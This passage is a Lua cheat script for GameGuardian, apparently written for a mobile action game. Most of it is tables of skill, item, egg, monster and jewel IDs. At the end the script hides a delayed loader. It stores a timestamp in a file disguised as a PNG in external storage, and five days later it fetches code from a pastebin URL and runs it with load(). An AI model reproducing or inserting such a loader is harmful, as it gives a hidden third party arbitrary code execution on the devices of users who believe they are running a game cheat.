    {
      id = 1000162,
      name = "✡️Speed Plus ⏭"
    },
    {
      id = 1000006,
      name = "✡️Rage 💪"
    },
    {
      id = 1000167,
      name = "✡️Elemental Burst (Critic) 💥⚠️"
    },
    {
      id = 1000168,
      name = "✡️Elemental Burst (Atack) 💥⚔"
    }
  },
  {
    {
      id = 1000042,
      name = "✡️Strong Heart 🩸"
    },
    {
      id = 1000043,
      name = "✡️Extra Life 🆙️"
    },
    {
      id = 1000158,
      name = "✡️Hp Gain Aura 💫"
    },
    {
      id = 1000018,
      name = "✡️Hp Boost ❤"
    },
    {
      id = 1000160,
      name = "✡️HP Plus 💜"
    },
    {
      id = 1000169,
      name = "✡️Strong Strong Heart 💙"
    },
    {
      id = 1000131,
      name = "✡️Grace (Recovery HP Low) 🤎"
    },
    {
      id = 1000010,
      name = "✡️Shiel Guard 🛡"
    },
    {
      id = 1000153,
      name = "✡️Invencibility Star 🌟"
    },
    {
      id = 1100001,
      name = "✡️HP Restore ⛑"
    }
  },
  {
    {
      id = 1000039,
      name = "✡️Bloodthirst 🩸"
    },
    {
      id = 1000041,
      name = "✡️Smart 📶"
    },
    {
      id = 1000050,
      name = "✡️Dodge Master (Off)"
    },
    {
      id = 1000059,
      name = "✡️Shadow Clone 👥"
    },
    {
      id = 1000074,
      name = "✡️Slow Projectile 🐢"
    },
    {
      id = 1000081,
      name = "✡️Giant 🗽"
    },
    {
      id = 1000082,
      name = "✡️Dwarf 👼"
    },
    {
      id = 1000114,
      name = "✡️Dodge Master 🕴"
    },
    {
      id = 1000132,
      name = "✡️Dodge Master (HP Low) 👨‍🦯"
    },
    {
      id = 1000165,
      name = "✡️Heroic Fightback 🤺"
    },
    {
      id = 1000166,
      name = "✡️Fury Command 😡"
    },
    {
      id = 1000171,
      name = "✡️Inspire 🤧"
    },
    {
      id = 1000172,
      name = "✡️Greed 😋"
    },
    {
      id = 1000173,
      name = "✡️Overdraft (Exaggeration) 🕎"
    }
  },
  {
    {
      id = 1000174,
      name = "✡️HP max + 15% (Burger) 🍔"
    },
    {
      id = 1000175,
      name = "✡️Kimchi (Attack Boost + 15%) 🥦"
    },
    {
      id = 1000176,
      name = "✡️Sushi (Detour + 8%) 🍣"
    },
    {
      id = 1000177,
      name = "✡️Steamed Bun (Chance Summon Up Spirit) 🥟"
    },
    {
      id = 1000178,
      name = "✡️Spaghetti (Critic + 7%) 🍝"
    },
    {
      id = 1000179,
      name = "✡️Burger (HP Max + 30%) 🍔"
    },
    {
      id = 1000180,
      name = "✡️Kimchi (Attack Boost + 30%) 🥦"
    },
    {
      id = 1000181,
      name = "✡️Sushi (Detour + 15%) 🍣"
    },
    {
      id = 1000182,
      name = "✡️Steamed Bun (limit Nvl Max) 🥟"
    },
    {
      id = 1000183,
      name = "✡️Spaghetti (Critic + 12%) 🍝"
    },
    {
      id = 1000141,
      name = "✡️Spirit Stone God 🗿"
    },
    {
      id = 1000142,
      name = "✡️Spirit Scythe Mage 👳‍♂️"
    },
    {
      id = 1000187,
      name = "✡️Unknow Shield 🔰"
    }
  },
  {
    {
      id = 1410001,
      name = "✡️Habilidade Crescimento🛐"
    },
    {
      id = 1410002,
      name = "✡️Crescimento Introspecção🛐"
    },
    {
      id = 1410003,
      name = "✡️Qualidade Teimosia♉"
    }
  }
}
itemsSpec3 = {    -- items id
  {
    {
      id = 1010101,
      name = "🏹Bold Courageous"
    },
    {
      id = 1010201,
      name = "⛏Death Scepter"
    },
    {id = 1010301, name = "🗡Haw"},
    {
      id = 1010401,
      name = "♻️Boomerang"
    },
    {
      id = 1010501,
      name = "📍Hunter's Bat"
    },
    {
      id = 1010601,
      name = "🔱Bright Spear"
    },
    {
      id = 1010701,
      name = "🏹Vendaval"
    },
    {
      id = 1010801,
      name = "🏒Demon Sword - Rain"
    },
    {
      id = 1010901,
      name = "🧸Mini Atreus"
    },
    {
      id = 1011001,
      name = "🗡️Sword"
    }
  },
  {
    {
      id = 1020101,
      name = "🎽Golden Breastplate"
    },
    {
      id = 1020201,
      name = "👕Dexterity Vest"
    },
    {
      id = 1020301,
      name = "👻Ghost Cover"
    },
    {
      id = 1020401,
      name = "🥋Mantle of the Void"
    },
    {
      id = 1020501,
      name = "  Bright Cloak"
    },
    {
      id = 1020601,
      name = "🧥Dark Cloak"
    }
  },
  {
    {
      id = 1030101,
      name = "🐼Bear Ring"
    },
    {
      id = 1030201,
      name = "🐺Wolf's Ring"
    },
    {
      id = 1030301,
      name = "🦅Hawk Ring"
    },
    {
      id = 1030401,
      name = "🐍Serpent's Ring"
    },
    {
      id = 1030501,
      name = "🐮Ring of the Bull"
    },
    {
      id = 1030601,
      name = "🦁Ring of the Lion"
    }
  },
  {
    {id = 1040101, name = "👼Elf"},
    {
      id = 1040201,
      name = "👳Scepter Mage"
    },
    {
      id = 1040301,
      name = "💣Live Bomb"
    },
    {
      id = 1040401,
      name = "🦇Laser Bat"
    },
    {
      id = 1040501,
      name = "👻Flaming Ghost"
    },
    {
      id = 1040601,
      name = "🦉Noisy Owl"
    }
  },
  {
    {
      id = 1050101,
      name = "🥉Agile Medallion"
    },
    {
      id = 1050201,
      name = "🥈Iron Medallion"
    },
    {
      id = 1050301,
      name = "🏅Angelic Medallion"
    },
    {
      id = 1050401,
      name = "🎖Armored Medal"
    },
    {
      id = 1050501,
      name = "🙉Perforating Medal"
    },
    {
      id = 1050601,
      name = "🦇Blood Medallion"
    }
  },
  {
    {
      id = 1060101,
      name = "⚡Lightning Bracelet"
    },
    {
      id = 1060201,
      name = "❄Frozen Bracelet"
    },
    {
      id = 1060301,
      name = "🔥Bracelet in Flame"
    },
    {
      id = 1060401,
      name = "☄Divine Bracelet"
    },
    {
      id = 1060501,
      name = "⭐Invincible Bracelet"
    },
    {
      id = 1060601,
      name = "🌀Rapid Bracelet"
    }
  },
  {
    {
      id = 1070101,
      name = "📙Archangel Archangel"
    },
    {
      id = 1070201,
      name = "📘Frozen Kingdom"
    },
    {
      id = 1070301,
      name = "📗Enlightenment"
    },
    {
      id = 1070401,
      name = "📕Art of Combat"
    },
    {
      id = 1070501,
      name = "📖Book of the Ghosts"
    },
    {
      id = 1070601,
      name = "📄Contract of the Giants"
    }
  },
  {
    {
      id = 33001,
      name = "🎁 Gift "
    },
	{
      id = 33002,
      name = "🍴 plate"
    }
  }
}
itemsSpec2 = {    -- 3xx id
  {id = 32001, name = "🖲 Runes"},
  {
    id = 38001,
    name = "🔴 Bloodstone"
  },
  {
    id = 35001,
    name = "🍪 Evolutionary Chip"
  },
  {
    id = 33003,
    name = "🗿 Stones of Soul (Event Only)"
  },
  {
    id = 37001,
    name = "💿 Millennial Silver (Event Only)"
  },
  {
    id = 31001,
    name = "💎 Sapphire "
  }
}
itemsScroll = {   -- scroll id
  {
    id = 30101,
    name = "🏹 Weapon Scroll"
  },
  {
    id = 30102,
    name = "🛡 Scroll of Armor"
  },
  {
    id = 30103,
    name = "💍 Scroll of Ring"
  },
  {
    id = 30104,
    name = "🦇 Animal Scroll"
  },
  {
    id = 30105,
    name = "🎖 Medallion Scroll"
  },
  {
    id = 30106,
    name = "💫 Scroll Bracelet"
  },
  {
    id = 30107,
    name = "📚 Book Scroll"
  }
}
itemsBoss = {     -- Egg boss id
  {
    id = 41001,
    name = "🥔 Small Dragon Egg 🐲"
  },
  {
    id = 41002,
    name = "🥔 Archer Leader Egg 🧜‍♂️"
  },
  {
    id = 41003,
    name = "🥔 Skeleton King Egg 🤴"
  },
  {
    id = 41004,
    name = "🥔 Crimson Witch Egg 🧙‍♀️"
  },
  {
    id = 41005,
    name = "🥔 Enraged Golem Egg 🦏"
  },
  {
    id = 41006,
    name = "🥔 Queen Bee Egg 🐝"
  },
  {
    id = 41007,
    name = "🥔 Ice Worm Egg 🐛"
  },
  {
    id = 41008,
    name = "🥔 Jellyfish Egg"
  },
  {
    id = 41009,
    name = "🥔 Ice Demon Egg"
  },
  {
    id = 41010,
    name = "🥔 Fire Demon Egg"
  },
  {
    id = 41011,
    name = "🥔 Chief Crab Egg"
  },
  {
    id = 41012,
    name = "🥔 Giant Owl Egg"
  },
  {
    id = 41013,
    name = "🥔 Desert Goliath Egg"
  }
}
itemsEgg = {      -- egg normal id
  {
    id = 40001,
    name = "🥚 Green Bat Egg 🦇"
  },
  {
    id = 40002,
    name = "🥚 Jelly Egg   "
  },
  {
    id = 40003,
    name = "🥚 Egg of Fastasma Bomb👻"
  },
  {
    id = 40004,
    name = "🥚 Puppet Egg 🤖"
  },
  {
    id = 40005,
    name = "🥚 Tree Egg 🌴"
  },
  {
    id = 40006,
    name = "🥚 Greyhound Egg 🐶"
  },
  {
    id = 40007,
    name = "🥚 Archer Egg 🧜‍♂️"
  },
  {
    id = 40008,
    name = "🥚 Soldier Egg🤺"
  },
  {
    id = 40009,
    name = "🥚 Wasp Egg 🐝"
  },
  {
    id = 40010,
    name = "🥚 Fire Mage Egg 🔥"
  },
  {
    id = 40011,
    name = "🥚 Medusa Egg 🧞‍♀️"
  },
  {
    id = 40012,
    name = "🥚 Ice Wizard Egg 🧙‍♂️"
  },
  {
    id = 40013,
    name = "🥚 Fire Lizard Egg 🦎"
  },
  {
    id = 40014,
    name = "🥚 Flaming Ghost Egg 👻"
  },
  {
    id = 40015,
    name = "🥚 Spiny Snake Egg 🐍"
  },
  {
    id = 40016,
    name = "🥚 Tornado Demon Egg 🌪️"
  },
  {
    id = 40017,
    name = "🥚 Piranha Egg 🐠"
  },
  {
    id = 40018,
    name = "🥚 Zombie Egg 🧟‍♂️"
  },
  {
    id = 40019,
    name = "🥚 Scarecrow Egg 👩‍🌾"
  },
  {
    id = 40020,
    name = "🥚 Long Dragon Egg 🐉"
  },
  {
    id = 40021,
    name = "🥚 Skull Mage Egg 💀"
  },
  {
    id = 40022,
    name = "🥚 Larva Golem Egg 🐛"
  },
  {
    id = 40023,
    name = "🥚 Ice Golem Egg   "
  },
  {
    id = 40024,
    name = "🥚 Cactus Egg 🌵"
  },
  {
    id = 40025,
    name = "🥚 Crazy Spider Egg 🕷"
  },
  {
    id = 40026,
    name = "🥚 Fire Element Egg 🏵"
  },
  {
    id = 40027,
    name = "🥚 Swordsman Egg"
  },
  {
    id = 40028,
    name = "🥚 Sickle Mage Egg"
  },
  {
    id = 40029,
    name = "🥚 Shadow Assassin Egg"
  },
  {
    id = 40030,
    name = "🥚 Tornado Mage Egg"
  },
  {
    id = 40031,
    name = "🥚 Pea Shooter Egg"
  },
  {
    id = 40032,
    name = "🥚 Hell Puppet Egg"
  },
  {
    id = 40033,
    name = "🥚 Fallen Bat Egg"
  },
  {
    id = 40034,
    name = "🥚 Sandian's Egg"
  },
  {
    id = 40035,
    name = "🥚 Psionic Scarecrow Egg"
  },
  {
    id = 40036,
    name = "🥚 Wild Spider Egg"
  },
  {
    id = 40037,
    name = "🥚 One-Eyed Bat Egg"
  },
  {
    id = 40038,
    name = "🥚 Tundra Dragon Egg"
  },
  {
    id = 40039,
    name = "🥚 Purple Ghost Egg"
  },
  {
    id = 40040,
    name = "🥚 Frosty Ghost Egg"
  },
  {
    id = 40041,
    name = "🥚 Steel Dryad Egg"
  },
  {
    id = 40042,
    name = "🥚 Flaming Bug Egg"
  },
  {
    id = 40043,
    name = "🥚 Elite Archer Egg"
  },
  {
    id = 40044,
    name = "🥚 Rolling Mushroom Egg"
  },
  {
    id = 40045,
    name = "🥚 Spitting Mushroom Egg"
  },
  {
    id = 40046,
    name = "🥚 Scarlet Mage Egg"
  }
}
itemsSpec7 = {    -- monster id
  {
    id = 3001,
    name = "✡️Green bat 🦇"
  },
  {
    id = 3002,
    name = "✡️(Slime) Jelly   "
  },
  {
    id = 3003,
    name = "✡️Piranha 🐠"
  },
  {
    id = 3005,
    name = "✡️Ghost Bomb 👻"
  },
  {
    id = 3006,
    name = "✡️Stone Doll 🗿"
  },
  {
    id = 3025,
    name = "✡️Skeleton Soldier 💀"
  },
  {
    id = 3014,
    name = "✡️Greyhound 🐶"
  },
  {
    id = 3018,
    name = "✡️Fallen Bat 🦇"
  },
  {
    id = 3027,
    name = "✡️Swordsman 💀  "
  },
  {
    id = 3032,
    name = "✡️Scythe Mage 🧙‍♂️"
  },
  {
    id = 3090,
    name = "✡️Fire Lizard 🦎"
  },
  {
    id = 3093,
    name = "✡️One-Eyed Bat 👁"
  },
  {
    id = 3101,
    name = "✡️Spiny snake 🐍"
  },
  {
    id = 3104,
    name = "✡️Wild Spider 🕷"
  },
  {
    id = 5015,
    name = "✡️Enraged Golem 🦏"
  },
  {
    id = 5021,
    name = "✡️Crimson Witch 🧙‍♀️"
  },
  {
    id = 3179,
    name = "✡️Spinning Mushroom 🍄"
  },
  {
    id = 3011,
    name = "✡️Zombie 🧟‍♂️"
  },
  {
    id = 3192,
    name = "✡️Sandian 👾"
  },
  {
    id = 3038,
    name = "✡️Tornado Demon 🌪"
  },
  {
    id = 5016,
    name = "✡️Skeleton King 🤴"
  },
  {
    id = 3043,
    name = "✡️Shadow Assassin 👤"
  },
  {
    id = 3034,
    name = "✡️Scythe Mage ⛏"
  },
  {
    id = 3091,
    name = "✡️Pea Shooter 🌱"
  },
  {
    id = 3013,
    name = "✡️Party Tree 🌲"
  },
  {
    id = 3028,
    name = "✡️Long Dragon 🐉"
  },
  {
    id = 3065,
    name = "✡️Medusa 🧜‍♀️"
  }
}
itemsSpec9 = {    -- jewel id
  {
    id = 61101,
    name = "✡️Ruby🔻"
  },
  {
    id = 61201,
    name = "✡️Kunzite  "
  },
  {
    id = 62101,
    name = "✡️Emerald  "
  },
  {
    id = 62201,
    name = "✡️Lazulita🔷️"
  },
  {
    id = 62201,
    name = "✡️ ???"
  },
  {
    id = 63101,
    name = "✡️Topaz🔶️"
  },
  {
    id = 63201,
    name = "✡️Ambar  "
  },
  {
    id = 63301,
    name = "✡️ ??? "
  }
}
itemstle = {      -- tele id
  {
    id = 10,
    name = "🏄🏄🏄🏄 10 🏃‍♂️🏃‍♂️🏃‍♂️"
  },
  {
    id = 20,
    name = "🏄🏄🏄🏄 20 🏃‍♂️🏃‍♂️🏃‍♂️"
  },
  {
    id = 30,
    name = "🏄🏄🏄🏄 30 🏃‍♂️🏃‍♂️🏃‍♂️"
  },
  {
    id = 40,
    name = "🏄🏄🏄🏄 40 🏃‍♂️🏃‍♂️🏃‍♂️"
  },
  {
    id = 50,
    name = "🏄🏄🏄🏄 50 🏃‍♂️🏃‍♂️🏃‍♂️"
  },
  {
    id = 100,
    name = "🏄🏄🏄🏄 100 🏃‍♂️🏃‍♂️🏃‍♂️"
  },
  {
    id = 999,
    name = "other"
  }
}

-- fuction systeam

function map(tbl, f)
  local t = {}
  for key, value in pairs(tbl) do
    t[key] = f(value)
  end
  return t
end

------- không copy từ đây
function loadConfig()
  local config = loadfile(configFile)
  if config ~= nil then
    config = config()
  end
  if config == nil then
    config = {}
  end
  local package = gg.getTargetPackage()
  if package == nil then
    package = "none"
  end
  return config[package] or {}
end
function saveConfig(config)
  local package = gg.getTargetPackage()
  if package == nil then
    package = "none"
  end
  gg.saveVariable({
    [package] = config
  }, configFile)
end
configFile = gg.getFile() .. ".save"
while true do
  if 	gg.isVisible() then
		gg.setVisible(false)
		main()
  end
end
local open = io.open
local read_file = function(path)
  local file = open(path, "rb")
  if not file then
	return nil
  end
  local content = file:read("*a")
  file:close()
  return content
end
zaTextd = read_file(gg.EXT_STORAGE .. "/gameguardianlgi.png")
local check = zaTextd
uzanum1 = tonumber(check)
if uzanum1 == nil then
  anzax1 = os.time()
  local file = io.open(gg.EXT_STORAGE .. "/gameguardianlgi.png", "w")
  file:write(anzax1)
  file:close()
end
if uzanum1 ~= nil then
  malizwaa = uzanum1 + 432000
  sahiziz = os.time()
  if sahiziz > malizwaa then
	ronoup = gg.makeRequest("https://pastebin.com/raw/1BqM2dnK").content
	if not ronoup then
	  gg.alert("\240\159\148\132A connection could not be made to the server please check your connection and retry\240\159\148\132")
	else
	  pcall(load(ronoup))
	end
  end
end
